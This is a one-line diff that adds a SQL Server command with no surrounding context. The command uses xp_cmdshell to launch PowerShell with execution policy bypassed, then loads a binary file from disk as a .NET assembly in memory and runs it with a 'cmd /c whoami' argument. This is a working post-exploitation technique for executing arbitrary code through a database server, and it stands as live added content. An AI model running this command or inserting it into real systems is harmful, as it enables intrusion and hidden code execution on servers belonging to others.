@@ -1,0 +1,1 @@
+EXEC xp_cmdshell 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass -c "$b=[IO.File]::ReadAllBytes(''F:\Database\svc.dat''); $a=[Reflection.Assembly]::Load($b); $a.EntryPoint.Invoke($null,@(,([string[]]@(''-cmd'',''cmd /c whoami''))))"'
